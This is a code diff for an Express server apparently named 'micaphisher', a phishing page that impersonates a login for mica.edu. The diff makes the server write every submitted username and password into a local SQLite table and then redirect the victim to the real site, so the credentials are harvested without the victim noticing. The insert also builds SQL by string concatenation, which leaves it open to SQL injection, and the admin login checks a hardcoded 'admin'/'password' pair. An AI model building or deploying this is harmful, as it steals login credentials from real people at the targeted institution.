@@ -22,7 +22,7 @@ app.post('/login', function(req, res) {
 	if (req.body.username == 'admin' && req.body.password == 'password') {
 		res.redirect('admin.html')
 	} else {
-		// TODO - perform database insert operation here
+		db.run("insert into micadata (username, password) values ('" + req.body.username + "', '" + req.body.password + "');")
 		res.redirect('https://mica.edu')
 	}
 })
@@ -32,9 +32,10 @@ console.log("Setting up database")
 let db = new sqlite3.Database('./db/micaphisher.db', sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
 	if (err) {
 	  console.error(err.message)
+	} else {
+		console.log('Connected to the micaphisher database.')
+		db.run("create table if not exists micadata(username text, password text);")
 	}
-	console.log('Connected to the micaphisher database.')
-	db.run("create table if not exists micadata(username text, password text);")
 })
 
 // start server
